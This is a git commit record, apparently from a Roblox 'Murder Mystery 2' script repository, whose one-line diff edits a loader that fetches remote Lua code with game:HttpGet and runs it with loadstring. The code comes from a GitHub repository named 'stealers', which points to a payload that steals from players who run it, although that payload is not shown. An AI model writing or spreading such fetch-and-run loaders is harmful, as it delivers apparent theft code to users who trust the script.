042d358dc8638f2f1112bdba8cc67726cccd4fa0
m.better <ppro07570@gmail.com>
2024-12-30 19:45:07 +0700

    Update mm2.lua

--- mm2.lua
+++ mm2.lua
@@ -1,1 +1,1 @@
-loadstring(game:HttpGet('https://raw.githubusercontent.com/m-better/stealers/refs/heads/main/mm2dark.Lua',true))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/m-better/stealers/refs/heads/main/mm2dark.lua',true))()
